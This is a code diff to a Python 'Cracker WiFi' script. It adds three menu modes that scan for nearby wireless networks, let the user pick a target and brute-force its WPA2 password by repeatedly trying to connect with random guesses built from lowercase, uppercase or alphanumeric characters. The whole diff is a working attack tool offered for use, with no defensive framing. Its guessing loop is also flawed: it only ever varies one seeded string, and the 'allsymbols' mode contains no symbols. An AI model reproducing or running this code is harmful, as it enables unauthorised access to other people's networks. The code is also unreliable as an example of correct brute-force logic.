@@ -3,6 +3,7 @@ from pywifi import const, PyWiFi ,Profile
 from time import sleep
 import os
 from colorama import Fore as color
+import random
 
 os.system("cls")
 print(color.RED+"""
@@ -25,10 +26,19 @@ print('')
 print(color.LIGHTBLACK_EX+"2. Cracker WiFi With Your PassWord List")
 sleep(0.1)
 print("")
-print(color.LIGHTBLACK_EX+"3. Cracker WiFi when incremented password test value by one")
+print(color.LIGHTBLACK_EX+"3. Cracker WiFi with number only")
 sleep(0.1)
 print("")
-print("4. LOGOUT")
+print(color.LIGHTBLACK_EX+"4. Cracker WiFi with lower case letters only")
+sleep(0.1)
+print("")
+print(color.LIGHTBLACK_EX+"5. Cracker WiFi with upper case letters only")
+sleep(0.1)
+print("")
+print(color.LIGHTBLACK_EX+"6. Cracker WiFi with allsymbols")
+sleep(0.1)
+print("")
+print("7. close")
 sleep(0.1)
 print("")
 
@@ -203,9 +213,189 @@ elif userInput == "3":
             print(color.GREEN+"PASSWORD : {}".format(password))
             print("-" *30)
             break
+elif userInput == "4":
+    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
 
+    def scan(): # For Scan the area
+        interface.scan()
+        sleep(8)
+        result = interface.scan_results()
+        return result
 
+    def testwifi(ssid , password):
+        interface.disconnect()
+        profile = Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = password
+        interface.connect(interface.add_network_profile(profile))
+        sleep(1)
+        if interface.status() == const.IFACE_CONNECTED:
+            interface.remove_network_profile(profile)
+            return True
+        else:
+            interface.remove_network_profile(profile)
+            return False
+            
 
+    
+    wifi = PyWiFi() # Wifi Object
+    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
+    print("")
+    print("Test PassWord List Default")
+    sleep(0.1)
+    print("")
+
+    print(color.GREEN+"<<Scanning ... ")
+    APs = scan()
+
+    for i in range(len(APs)):
+        print("{} - {}".format(i+1 ,APs[i].ssid))
+
+    index = int(input("\n>> "))
+    target = APs[index-1]
+
+    characters = "abcdefghijklmnopqrstuvwxyz"
+    password = ""
+    length = int(input(color.LIGHTMAGENTA_EX+"Enter length to try: "))
+    randomNum = 0
+    ran = ""
+    for index in range(length):
+        password += random.choice(characters)
+    while True:
+        randomNum = random.randrange(0,length-1)
+        res = password.replace(password[randomNum],random.choice(characters))
+        print(color.RED+"Testing: {}".format(res))
+        if testwifi(target.ssid,res):
+            print("-" *30)
+            print(color.GREEN+"PASSWORD : {}".format(res))                
+            print("-" *30)
+            break
+
+elif userInput == "5":
+    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
+
+    def scan(): # For Scan the area
+        interface.scan()
+        sleep(8)
+        result = interface.scan_results()
+        return result
+
+    def testwifi(ssid , password):
+        interface.disconnect()
+        profile = Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = password
+        interface.connect(interface.add_network_profile(profile))
+        sleep(1)
+        if interface.status() == const.IFACE_CONNECTED:
+            interface.remove_network_profile(profile)
+            return True
+        else:
+            interface.remove_network_profile(profile)
+            return False
+            
+
+    
+    wifi = PyWiFi() # Wifi Object
+    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
+    print("")
+    print("Test PassWord List Default")
+    sleep(0.1)
+    print("")
+
+    print(color.GREEN+"<<Scanning ... ")
+    APs = scan()
+
+    for i in range(len(APs)):
+        print("{} - {}".format(i+1 ,APs[i].ssid))
+
+    index = int(input("\n>> "))
+    target = APs[index-1]
+
+    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    password = ""
+    length = int(input(color.LIGHTMAGENTA_EX+"Enter length to try: "))
+    randomNum = 0
+    ran = ""
+    for index in range(length):
+        password += random.choice(characters)
+    while True:
+        randomNum = random.randrange(0,length-1)
+        res = password.replace(password[randomNum],random.choice(characters))
+        print(color.RED+"Testing: {}".format(res))
+        if testwifi(target.ssid,res):
+            print("-" *30)
+            print(color.GREEN+"PASSWORD : {}".format(res))                
+            print("-" *30)
+            break
+
+elif userInput == "6":
+    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
+
+    def scan(): # For Scan the area
+        interface.scan()
+        sleep(8)
+        result = interface.scan_results()
+        return result
+
+    def testwifi(ssid , password):
+        interface.disconnect()
+        profile = Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = password
+        interface.connect(interface.add_network_profile(profile))
+        sleep(1)
+        if interface.status() == const.IFACE_CONNECTED:
+            interface.remove_network_profile(profile)
+            return True
+        else:
+            interface.remove_network_profile(profile)
+            return False
+            
+
+    
+    wifi = PyWiFi() # Wifi Object
+    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
+    print("")
+    print("Test PassWord List Default")
+    sleep(0.1)
+    print("")
+
+    print(color.GREEN+"<<Scanning ... ")
+    APs = scan()
+
+    for i in range(len(APs)):
+        print("{} - {}".format(i+1 ,APs[i].ssid))
+
+    index = int(input("\n>> "))
+    target = APs[index-1]
+
+    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    password = ""
+    length = int(input(color.LIGHTMAGENTA_EX+"Enter length to try: "))
+    randomNum = 0
+    ran = ""
+    for index in range(length):
+        password += random.choice(characters)
+    while True:
+        randomNum = random.randrange(0,length-1)
+        res = password.replace(password[randomNum],random.choice(characters))
+        print(color.RED+"Testing: {}".format(res))
+        if testwifi(target.ssid,res):
+            print("-" *30)
+            print(color.GREEN+"PASSWORD : {}".format(res))                
+            print("-" *30)
+            break
+          
 
 else:
     print("cya")
